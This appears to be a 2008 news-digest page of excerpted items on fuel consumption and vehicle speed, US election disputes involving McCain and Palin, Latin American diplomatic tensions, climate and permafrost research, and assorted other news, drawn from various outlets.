HOW TO REDUCE VEHICLE FUEL CONSUMPTION 75 % WITH CURRENT TECHNOLOGY
Low Tech Magazine -
If we cut the average speed of all vehicles by half , fuel consumption would decrease by a whopping 75 percent .
. .
Engineers treat velocity as a non-variable , while in fact it is the most powerful factor to save a really huge amount of energy - with just one stroke , at minimal cost , and without the need for new technology .
Lower speeds combined with more energy efficient engines , better aerodynamics and lighter materials could make fuel savings even larger .
Air resistance ( drag ) increases with the square of speed , and therefore the power needed to push an object through air increases with the cube of the velocity .
If a car cruising on the highway at 80 km/h requires 30 kilowatts to overcome air drag , that same car will require 240 kilowatts at a speed of 160 km / h.. . .
Drag can be partly offset by better aerodynamics : a boxy car like the Volvo 740 has a drag area that is almost twice that of the most aerodynamic standard car , the Honda Insight .
The Volvo needs almost two times the engine power of the Honda when driven at 120 km/h .
Yet a Volvo 740 driving at 60 km/h will face less than half the drag and will need 4.6 times less energy power than a Honda Insight driving at 120 km /h .
When compared to velocity , the potential of aerodynamics is limited .
. .
The blindness for the importance of speed leads to doubtful conclusions , like the environmentally friendly label of high speed trains .
The French TGV that set the most recent speed record at 575 km/h for wheeled trains in 2007 has an engine output of 19,600 kilowatts .
A contemporary " slow " train like the Siemens ES64 with a top speed of 240 km/h has a maximum power output of 6,400 kilowatts .
Travelling 1,000 kilometres , the " slow " train will consume 26,240 kilowatt - hours ( over 4.1 hours ) while the fast train will consume 33.320 kilowatt - hours ( over 1.7 hours ) .
. . .
A decrease of 75 percent in fuel consumption is not peanuts .
More than 60 percent of world oil production is used for transportation , which means that total oil production would be almost halved .
In combination with more efficient engines , better aerodynamics and lighter materials a 75 percent reduction of oil production is not unrealistic .
Yet , when the International Energy Agency argues that the average car sold in 2030 would need to consume 60 percent less fuel than the average car sold in 2005 , it claims : " With current technologies , only plug - in hybrids are capable of this " .
This statement is wrong .
We could lower the fuel consumption of cars ( and other vehicles ) by at least 75 percent , we could do it today , and we can do it with present technology .
GOP PLANS TO DISENFRANCHISE FORECLOSED VOTERS
Michigan Messenger -
The chairman of the Republican Party in Macomb County Michigan , a key swing county in a key swing state , is planning to use a list of foreclosed homes to block people from voting in the upcoming election as part of the state GOP 's effort to challenge some voters on Election Day .
' We will have a list of foreclosed homes and will make sure people are n't voting from those addresses , ' party chairman James Carabelli told Michigan Messenger in a telephone interview earlier this week .
He said the local party wanted to make sure that proper electoral procedures were followed .
. .
One expert questioned the legality of the tactic .
' You ca n't challenge people without a factual basis for doing so , ' said J. Gerald Hebert , a former voting rights litigator for the U.S. Justice Department who now runs the Campaign Legal Center , a Washington D.C. - based public - interest law firm .
' I do n't think a foreclosure notice is sufficient basis for a challenge , because people often remain in their homes after foreclosure begins and sometimes are able to negotiate and refinance . '
As for the practice of challenging the right to vote of foreclosed property owners , Hebert called it , ' mean - spirited . '

PALIN DROPPED SUPPORT FOR BRIDGE TO NOWHERE BUT TOOK FEDERAL MONEY TO BUILD ROAD TO NON - EXISTENT SPAN
Anchorage Daily News -
The Alaska governor campaigned in 2006 on a build - the - bridge platform , telling Ketchikan residents she felt their pain when politicians called them " nowhere . "
They 're still feeling pain today in Ketchikan , over Palin 's subsequent decision to use the bridge funds for other projects -- and over the timing of her announcement , which they say came in a pre-dawn press release that seemed aimed at national news deadlines .
" I think that 's when the campaign for national office began , " said Ketchikan Mayor Bob Weinstein on Saturday .
Meanwhile , Weinstein noted , the state is continuing to build a road on Gravina Island to an empty beach where the bridge would have gone -- because federal money for the access road , unlike the bridge money , would have otherwise been returned to the federal government .
MCCAIN WAS BORN WITH A SILVER THERMOMETER IN HIS MOUTH
HEALTHCARE BLOG - Sen. John McCain ( Ariz . ) emphasizes freedom , personal choice and responsibility when promoting his plan to reform America 's health care system .
He 's not calling for an incremental approach but " nothing short of a complete reform of the culture of our health system and the way we pay for it will suffice . " . . .
The man who wants to reduce state - regulated health insurance and hard - won consumer protections has never spent a day of his life outside the cozy blankets of publicy - sponsored government health coverage .
John Sidney McCain III was born in the Panama Canal Zone on Aug. 29 , 1936 while his father was a Navy admiral .
From this birth and throughout his childhood , Navy physicians cared for McCain .
After high school , McCain enrolled in the U.S. Military Academy , where the naval health care continued until he retired from the Navy in 1981 . .
After his naval retirement , he went straight to the U.S. House of Representatives after winning the 1982 election for Arizona 's 1st congressional district .
After serving two terms , he was elected to the Senate in 1986 , where he has been ever since .
Throughout that time , he qualified for the generous Federal Employees Health Benefits Program .
On his 65th birthday in 2001 , McCain qualified for Medicare .
MILITARY SUICIDES SOAR
Alternet - A VA report acknowledged that suicide rates for young male Iraq - and Afghanistan - era veterans hit a record high in 2006 , the last year for which official records are available .
. .
After five years of war in Iraq , Marine suicides doubled between 2006 and 2007 , and Army suicides are at the highest level since records were first kept in 1980 .
Reported suicide attempts jumped 500 percent between 2002 and 2007 .
BUSH STIRS UP TROUBLE IN LATIN AMERICA
Reuters - Honduras , a former U.S. ally in Central America now run by a leftist government , told a U.S. envoy not to present his credentials as ambassador on Friday in a diplomatic snub in support of Bolivia .
Bolivia and anti-U.S. Venezuelan President Hugo Chavez are in a fight with Washington over what they see as U.S. support for violent protests against Bolivian President Evo Morales .
Honduran President Manuel Zelaya , who has moved the country closer to Chavez , was due to receive a new U.S. ambassador on Friday in a ceremony at which the envoy would present a letter with his diplomatic credentials .
But Zelaya temporarily put off the event in support of Bolivia , a government source said .
. .
The United States imposed sanctions on aides to Venezuela 's Chavez on Friday in retaliation for his expulsion of the U.S. ambassador , escalating a crisis that raises the specter of a possible oil supply cutoff .
Bolivia and the United States expelled their respective ambassadors earlier this week after Morales accused Washington of supporting the opposition in the Andean country .
Violent anti-government protests have killed eight people in Bolivia , where rightist governors have rebelled against the popular president , demanding autonomy and rejecting his plans to overhaul the constitution and break up ranches to give land to poor Indians .
CNN - Bolivian President Evo Morales on Thursday accused the United States of fomenting a coup d'etat by rich eastern department landowners against him , and he called for the U.S. ambassador to leave for allegedly encouraging those protesters .
For the past two weeks , the demonstrators in the country 's richer eastern lowlands have been protesting Morales ' plans to redistribute the country 's natural gas revenues .
. .
Before expelling the U.S. diplomat from his country , Chavez also said Thursday that he had uncovered a U.S. - backed plot to remove him from power .
" It 's the empire that 's behind this , " he told supporters in a televised address .
" They go around looking for a way to stop our revolution and , with it , to strike all the processes of change that are occurring in our Americas , in the Caribbean , in Central America . "
Chavez then played a four - minute tape of what he said were conversations among current and retired members of the Venezuelan military discussing whom they could count on to support a movement against the presidential palace .
He said also that the presence of two Russian warplanes on Venezuelan soil for a training exercise " is a warning " to the rest of the world that Venezuela 's allies include Russia .
GREAT MOMENTS IN DIPLOMATIC STATEMENTS
From the Ministry of Foreign Affairs of Cuba , September 10
Yesterday , September 9 , 2008 , at 11:50 A.M. , the Department of State conveyed to the Interests Section of Cuba in Washington Note 252/18 in which , after expressing its regrets for the additional damage caused to the Cuban people by hurricane Ike , it insists in the visit to our country of a " humanitarian assessment team " to " inspect the affected areas " .
Today , September 10 , at 7:20 P.M. the Interests Section of Cuba in Washington sent to the Department of State Note No 046/08 , in which it conveys its appreciation for the expressions of regret by the Government of the United States for the damage caused in Cuba by hurricane Ike , and reiterates that Cuba does not require the assistance of a humanitarian assessment team as it has a sufficient number of trained specialists to deal with this task .
The Note emphasizes that if the Government of the United States is really willing to cooperate with the Cuban people it is requested to allow the sale to Cuba of indispensable material , such as materials for roofing , for building repairs and for the re-establishment of electric networks .
Likewise , it reiterates the request that the Government of the United States suspend the restrictions preventing U.S. companies from providing private commercial credits to Cuba for the purchase of foodstuffs in the United States .
The Note also calls the attention of the Department of State that the visit to Cuba of a humanitarian assessment team is not required to allow the sale of the aforementioned materials and to authorize private credits for the purchase of foodstuffs .
. .
This is a cynical attitude of the Government of the United States .
It attempts to suggest that it is desperate to cooperate with Cuba , and that we are the ones refusing .
It lies shamelessly .
Why does the Government of the United States insist on the pretext of carrying out an inspection " in situ " when the information disseminated regarding the serious effects caused by the hurricanes in Cuba is widespread and obvious ?
Why does it use the precondition of sending an inspection team , something that no one else has done among the scores of countries that are already generously cooperating with Cuba ?
Why does the Government of the United States refuse to allow Cuba to purchase materials for building repairs , roofing or components the re-establishment of electrical networks in the U.S. ?
Why does if forbid U.S. companies and their subsidiaries in all countries , to provide Cuba with private credit for the purchase of foodstuffs , which today are essential to ensure food for the affected population and to replace reserves in the event of new hurricanes ?. . .
Cuba has not asked the Government of the United States for any gift whatsoever .
Simply to be allowed to purchase .

A life - altering chain of events may be under way that launches a new music group into careers that take them to stages far beyond Bowdoinham .
Last Friday night , the Board of Selectmen were n't dealing with budgets or sludge management .
Instead , Bowdoinham 's Singing Selectmen met for their first practice session .
. .
Though it was the first time all three played together , it was quite a jamming frenzy , especially when the musicians sank into a rendition of " Proud Mary ( Rollin ' on the River ) . "
Selectmen Steve Ciembroniewicz and Wayne Dorr showed up at fellow Selectman David Whittlesey 's home with their guitars for the practice .
Whittlesey had his fiddle ready to go and they were soon tuning guitars in Whittlesey 's guest apartment .
. .
After trying a few songs , Dorr asked , " Do we have any Bob Marley ? "
Someone started playing instead " Proud Mary " and Dorr improvised a line or two : " ... Rollin ' , rollin ' , rollin ' on the Cathance [ a local revier - TPR ] "
With a song like that , " we can get the whole crowd singing , " Dorr said .
" We 'll have to get a few cops to keep the fans off us . "
Ciembroniewicz suggested they start off a cappella .
" Oh jeez , you guys , " Dorr murmured .
But he got to choose the key .

OUTLYING PRECINCTS
Wisconsin State Journal -
The state elections agency is investigating complaints about a massive campaign mailing Republican Sen .
John McCain 's presidential campaign has directed toward Wisconsin Democrats and other voters .
Each mailing includes at least one copy of the state application for an absentee ballot that has the address of a local clerk and a box for postage printed on the other side .
But in some cases , the incorrect clerk 's address is printed on the application , leading some Democrats to wonder if the Arizona senator 's campaign is deliberately trying to get them to apply for absentee ballots in places where they are n't eligible to vote .
" They 're trying to knock me off the rolls , " said Democrat Beverly Jambois , of Middleton .
" I can't tell you how upsetting it is to me .
This is how you win elections ?
By disenfranchising other voters ? "
Her household received the flier this week addressed to her husband , Robert , a lawyer for the state Department of Transportation .
The couple are registered to vote in Middleton , but the absentee ballot application was addressed to the city clerk 's office in Madison .
A McCain campaign spokeswoman said in a statement the mailing mistakes are " certainly not intentional " but she would n't answer questions .
The statement also said the mailing went to " potential supporters across the spectrum . " . . .
Wall Street Journal -
The biggest project that Sarah Palin undertook as mayor was an indoor sports complex , where locals played hockey , soccer , and basketball , especially during the long , dark Alaskan winters .
The only catch was that the city began building roads and installing utilities for the project before it had unchallenged title to the land .
The misstep led to years of litigation and at least $ 1.3 million in extra costs for a small municipality with a small budget .
What was to be Ms. Palin 's legacy has turned into a financial mess that continues to plague Wasilla .
. .
Litigation resulting from the dispute over Ms. Palin 's sports - complex project is still in the courts , with the land 's former owner seeking hundreds of thousands of additional dollars from the city .
Fact Check - September 12 , 2008 : Palin says Alaska supplies 20 percent of U.S. energy .
Not true .
Not even close .
Alaska did produce 14 percent of all the oil from U.S. wells last year , but that 's a far cry from all the " energy " produced in the U.S. Alaska 's share of domestic energy production was 3.5 percent , according to the official figures kept by the U.S. Energy Information Administration .
And if by " supply " Palin meant all the energy consumed in the U.S. , and not just produced here , then Alaska 's production accounted for only 2.4 percent ..
Sarah Palin 's church is boosting a conference aimed at turning gays into heterosexuals .
According to the Wasilla Bible Church bulletin , " " You 'll be encouraged by the power of God 's love and His desire to transform the lives of those impacted by homosexuality .

WATCHING THE COUNT
Wisconsin State Journal - Saying illegal Wisconsin votes could sway the presidential election , Attorney General J.B. Van Hollen has sued the state elections agency to force ineligible voters off the rolls .
But election experts warned that if the Justice Department lawsuit is successful , eligible voters could be disenfranchised and the state could face a post-election ballot - counting frenzy similar to Florida 's after the 2000 presidential race .
" You should n't penalize the voter because you 've got mistakes in your database , " said Dan Tokaji , an election law expert at Ohio State University .

Independent , UK -
The threat of global warming is so great that campaigners were justified in causing more than £ 35,000 worth of damage to a coal - fired power station , a jury decided .
The jury at Maidstone Crown Court cleared six Greenpeace activists of criminal damage .
Jurors accepted defence arguments that the six had a " lawful excuse " to damage property at Kingsnorth power station in Kent to prevent even greater damage caused by climate change .
The defence of " lawful excuse " under the Criminal Damage Act 1971 allows damage to be caused to property to prevent even greater damage ¬ such as breaking down the door of a burning house to tackle a fire .
The not - guilty verdict , delivered after two days and greeted with cheers in the courtroom , raises the stakes for the most pressing issue on Britain 's green agenda and could encourage further direct action .

If ever there was a car made for the times , this would seem to be it : a sporty subcompact that seats five , offers a navigation system , and gets a whopping 65 miles to the gallon .
. .
Ford 's 2009 Fiesta Econetic goes on sale in November .
But here 's the catch : Despite the car 's potential to transform Ford 's image and help it compete with Toyota Motor and Honda Motor in its home market , the company will sell the little fuel sipper only in Europe .
" We know it 's an awesome vehicle , " says Ford America President Mark Fields .
" But there are business reasons why we can't sell it in the U.S. "
The main one : The Fiesta Econetic runs on diesel .
Automakers such as Volkswagen and Mercedes - Benz have predicted for years that a technology called " clean diesel " would overcome many Americans ' antipathy to a fuel still often thought of as the smelly stuff that powers tractor trailers .
Diesel vehicles now hitting the market with pollution - fighting technology are as clean or cleaner than gasoline and at least 30 % more fuel - efficient .
Yet while half of all cars sold in Europe last year ran on diesel , the U.S. market remains relatively unfriendly to the fuel .
Taxes aimed at commercial trucks mean diesel costs anywhere from 40 cents to $ 1 more per gallon than gasoline .
Add to this the success of the Toyota Prius , and you can see why only 3 % of cars in the U.S. use diesel .
" Americans see hybrids as the darling , " says Global Insight auto analyst Philip Gott , " and diesel as old - tech . "

Tree Hugger - Following on the heels of a recently published study in the journal Nature Geoscience , which estimated that Arctic permafrost could hold 60 % more organic carbon than previously thought , a team of scientists from Australia 's Commonwealth Scientific and Industrial Research Organisation has found that the planet 's permafrost layers -- comprising an area that covers a fifth of Earth 's land mass -- store twice as much methane and carbon dioxide as previously believed . .
Release of even a fraction could greatly increase future temperature rise
While he said it was too early to start making dire predictions about future melting rates , Pep Canadell , a CSIRO atmospheric scientist who co-authored the paper , warned that : " With temperatures in the higher latitudes estimated to rise by as much as eight degrees by the end of this century , the world could experience a major melt of large tracts of permafrost in Canada , Russia , Alaska , Norway , Sweden , Finland and Greenland " .

. .
Travel industry experts said smaller airlines and tour operators were most at risk and warned passengers to book in a way that ensured they got their money back if an airline went bankrupt .
. .
Britain 's biggest tour operators , TUI Travel and Thomas Cook , have already announced they are cutting by about 8 per cent the number of holidays on offer next summer to avoid being caught out by falling demand .

Daily Mail , UK - David Miliband was subjected to an astonishing four - letter tirade from his Russian counterpart at the height of the Georgia crisis .
The Foreign Secretary received the undiplomatic tongue - lashing over the telephone after expressing the EU 's anger with the Kremlin . . .
At one point Sergei Lavrov , the colourful Russian foreign minister , became so incensed that he reportedly barked : ' Who the f*** are you to lecture me ? '
Mr Lavrov , who is seen as the fearsome face of Russia 's new aggressive foreign policy , objected to what he believed was Mr Miliband 's condescending tone .
He used full - strength industrial language to suggest to the Foreign Secretary that he knew little , if anything , of Russia 's history - perhaps unaware that Mr Miliband 's grandfather Samuel served in the Red Army and his father Ralph was a leading Marxist theoretician .
Such was the repeated use of the F - word that it was difficult to draft a readable note of the exchange , according to one insider who has seen the transcript .
A Whitehall source said : ' It was effing this and effing that .
It was not what you would call diplomatic language .
It was rather shocking . "
CNET - Leaders of the Association of Professional Flight Attendants , which represents some 19,000 workers including American Airlines flight attendants , asked American Airline 's management this week to consider adding filters to its in - flight Wi-Fi access to prevent passengers from viewing porn and other inappropriate Web sites while in - flight .
A union representative told Bloomberg News that attendants and passengers have raised " a lot of complaints " over the issue .
American Airlines is one of several airlines testing in - flight Internet access as a way to lure more passengers .
American has been offering the service on a limited basis since August 20th on some flights between New York , Los Angeles , and San Francisco , and between New York and Miami .
The cost of the service on cross-country flights is $ 12.95 , and it's $ 9.95 on the New York to Miami route .
. .
Given that people are packed onto planes literally elbow to elbow , it 's often hard not to at least glance at the laptop screen of the person sitting next to you .
But airlines have not banned people from reading pornographic magazines or watching their own DVDs on flights .
And it 's just as easy for someone to view a DVD of an adult video on a laptop or flip through Hustler as it is to surf porn Web sites .
